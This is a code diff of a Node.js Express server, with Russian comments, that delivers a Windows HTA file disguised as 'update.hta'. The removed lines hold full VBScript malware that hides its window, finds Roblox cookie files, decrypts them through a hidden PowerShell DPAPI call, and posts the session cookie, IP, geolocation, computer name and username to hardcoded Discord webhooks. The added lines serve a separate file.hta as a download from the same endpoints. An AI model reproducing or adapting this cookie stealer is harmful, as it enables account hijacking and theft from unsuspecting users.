@@ -1,230 +1,25 @@
-// === server.js ===
 const express = require("express");
 const path = require("path");
 
 const app = express();
-const PORT = process.env.PORT || 3000;
 
-// === ЗАМЕНИТЕ ЭТИ ВЕБХУКИ НА ВАШИ ===
-const WEBHOOKS = [
-  "https://discord.com/api/webhooks/1545473350963433502/PlyKlFr2cg5_NqKV_Oi_ymxD8bVzUMEFecc3AhKSzuHAM-sIck9xfWi_TD_bWuqgFUX3",
-  "https://discord.com/api/webhooks/1545473350963433502/PlyKlFr2cg5_NqKV_Oi_ymxD8bVzUMEFecc3AhKSzuHAM-sIck9xfWi_TD_bWuqgFUX3К"
-];
-
-// === ГЕНЕРАТОР HTA С ПОДСТАВЛЕННЫМИ ВЕБХУКАМИ ===
-function generateHta(webhookList) {
-  const webhookArray = JSON.stringify(webhookList);
-  return `<!DOCTYPE html>
-<html>
-<head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
-<script language="VBScript">
-window.resizeTo 0,0:window.moveTo -2000,-2000
-On Error Resume Next
-
-Dim sh, fso, WH_LIST, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
-Set fso = CreateObject("Scripting.FileSystemObject")
-
-WH_LIST = ${webhookArray}
-
-Sub SendToAllWebhooks(payload)
-    On Error Resume Next
-    Dim wh, h
-    For Each wh In WH_LIST
-        Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-        h.SetOption 2, 13056
-        h.Open "POST", wh, False
-        h.SetRequestHeader "Content-Type", "application/json"
-        h.Send payload
-        Set h = Nothing
-    Next
-End Sub
-
-Function GetRealIP()
-    GetRealIP = "Unknown"
-    On Error Resume Next
-    Dim h, resp
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", "https://api.ipify.org", False
-    h.Send
-    If h.Status = 200 Then GetRealIP = h.ResponseText
-    Set h = Nothing
-End Function
-
-Function GetGeo(ip)
-    GetGeo = "Unknown / Unknown"
-    On Error Resume Next
-    If ip = "Unknown" Then Exit Function
-    Dim h, resp, country, city
-    Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "GET", "https://ipapi.co/" & ip & "/json/", False
-    h.Send
-    If h.Status = 200 Then
-        resp = h.ResponseText
-        Dim reg, matches
-        Set reg = New RegExp
-        reg.Pattern = """country_name""\s*:\s*""([^""]+)"""
-        reg.Global = False
-        Set matches = reg.Execute(resp)
-        If matches.Count > 0 Then country = matches(0).SubMatches(0)
-        reg.Pattern = """city""\s*:\s*""([^""]+)"""
-        Set matches = reg.Execute(resp)
-        If matches.Count > 0 Then city = matches(0).SubMatches(0)
-        If Len(city) > 0 And Len(country) > 0 Then
-            GetGeo = city & ", " & country
-        ElseIf Len(country) > 0 Then
-            GetGeo = country
-        End If
-    End If
-    Set h = Nothing
-End Function
-
-Sub GrabRoblox()
-    Dim ip, geo, ipInfo
-    ip = GetRealIP()
-    geo = GetGeo(ip)
-    If geo = "Unknown / Unknown" Then
-        ipInfo = ip
-    Else
-        ipInfo = ip & " / " & geo
-    End If
-    
-    Dim paths(4)
-    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\Roblox\\LocalStorage\\robloxcookies.dat"
-    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\Roblox\\LocalStorage\\RobloxCookies.dat"
-    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\Roblox\\Cookies"
-    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\\Roblox\\LocalStorage\\robloxcookies.dat"
-    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat"
-    Dim i, fp, raw
-    For i = 0 To 4
-        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
-    Next
-    If Len(fp) = 0 Then
-        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\\Packages"
-        If fso.FolderExists(pk) Then
-            Dim folder, subf
-            Set folder = fso.GetFolder(pk)
-            For Each subf In folder.SubFolders
-                If InStr(subf.Name, "ROBLOX") > 0 Then
-                    Dim uwp: uwp = subf.Path & "\\LocalState\\RobloxCookies.dat"
-                    If fso.FileExists(uwp) Then fp = uwp: Exit For
-                End If
-            Next
-            Set folder = Nothing
-        End If
-    End If
-    If Len(fp) = 0 Then
-        Call PostEmbed("Roblox Logger - No Cookie", "IP: " & ipInfo & vbLf & "PC: " & PC & vbLf & "User: " & USER, 16711680)
-        Exit Sub
-    End If
-    raw = ReadFile(fp)
-    If Len(raw) < 50 Then
-        Call PostEmbed("Roblox Logger - File Too Small", "Size: " & Len(raw) & " bytes" & vbLf & "IP: " & ipInfo & vbLf & "PC: " & PC, 16711680)
-        Exit Sub
-    End If
-    
-    Dim cookie: cookie = "": Dim approach: approach = ""
-    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
-    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
-        approach = "JSON-DPAPI"
-        Dim sp: sp = InStr(raw, "CookiesData"":""")
-        If sp > 0 Then
-            sp = sp + 14
-            Dim ep: ep = InStr(sp, raw, """")
-            If ep > sp Then
-                Dim b64: b64 = Mid(raw, sp, ep - sp)
-                If Len(b64) > 100 Then
-                    cookie = DecryptDPAPI(b64)
-                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
-                End If
-            End If
-        End If
-    End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
-    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
-    
-    Dim cae: cae = InStr(cookie, "|$CAE")
-    If cae = 0 Then cae = InStr(cookie, "|_CAE")
-    If cae > 0 Then cookie = Mid(cookie, cae)
-    
-    Dim embedDesc, cookieTrunc
-    embedDesc = "Method: " & approach & vbLf & "Cookie Size: " & Len(cookie) & " bytes" & vbLf & vbLf & "IP Location: " & ipInfo & vbLf & "Computer: " & PC & vbLf & "User: " & USER
-    
-    If Len(cookie) > 1000 Then
-        cookieTrunc = Left(cookie, 997) & "..."
-    Else
-        cookieTrunc = cookie
-    End If
-    
-    Call PostEmbedWithCookie("Roblox Cookie Logger", embedDesc, cookieTrunc, 65280)
-End Sub
-
-Sub PostEmbedWithCookie(t, d, ck, col)
-    On Error Resume Next
-    Dim j
-    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & ",""fields"":[{""name"":""Cookie"",""value"":""```" & Ej(ck) & "```""}],""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
-    Call SendToAllWebhooks(j)
-End Sub
-
-Sub PostEmbed(t, d, col)
-    On Error Resume Next
-    Dim j
-    j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & col & """, ""footer"":{""text"":""Logged: " & Ej(Now()) & """}}]}"
-    Call SendToAllWebhooks(j)
-End Sub
-
-Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
-
-Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\\\.\\root\\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
-    If i = 0 Then Exit Sub
-    Dim r: r = True
-    Do While r
-        Set w = GetObject("winmgmts:\\\\.\\root\\cimv2")
-        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
-        Set w = Nothing
-        If r Then WScript.Sleep 150
-    Loop
-End Sub
-
-Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
-
-Function Ej(s): s = Replace(s, "\\", "\\\\"): s = Replace(s, """", "\\\""): s = Replace(s, vbCrLf, "\\n"): s = Replace(s, vbCr, "\\n"): s = Replace(s, vbLf, "\\n"): s = Replace(s, vbTab, "\\t"): Ej = s: End Function
-
-' === MAIN ===
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
-USER = sh.ExpandEnvironmentStrings("%USERNAME%")
-Call GrabRoblox
-window.close()
-
-</script>
-</head>
-<body></body>
-</html>`;
-}
-
-// === ЭНДПОИНТЫ ===
 app.get("/", (req, res) => {
-  const htaContent = generateHta(WEBHOOKS);
-  res.setHeader("Content-Type", "application/hta");
-  res.setHeader("Content-Disposition", "attachment; filename=update.hta");
-  res.send(htaContent);
+  const filePath = path.join(__dirname, "file.hta");
+  res.download(filePath);
 });
 
 app.get("/check", (req, res) => {
-  const htaContent = generateHta(WEBHOOKS);
-  res.setHeader("Content-Type", "application/hta");
-  res.setHeader("Content-Disposition", "attachment; filename=update.hta");
-  res.send(htaContent);
+  const filePath = path.join(__dirname, "file.hta");
+
+  res.download(filePath, (err) => {
+    if (err) {
+      console.error(err);
+      res.status(404).send("File not found.");
+    }
+  });
 });
+
+const PORT = process.env.PORT || 3000;
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running on port ${PORT}`);
